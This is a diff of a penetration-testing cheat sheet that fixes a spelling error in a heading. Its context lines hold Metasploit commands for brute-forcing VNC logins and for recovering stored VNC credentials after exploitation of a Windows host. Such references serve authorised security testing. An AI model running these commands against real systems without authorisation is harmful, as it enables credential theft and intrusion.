@@ -39,7 +39,7 @@ msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <
 msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run"
 ```
 
-## vnc - post exploit retreive credentials
+## vnc - post exploit retrieve credentials
 #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 msfconsole -x "use post/windows/gather/credentials/vnc; set SESSION <session>; run"
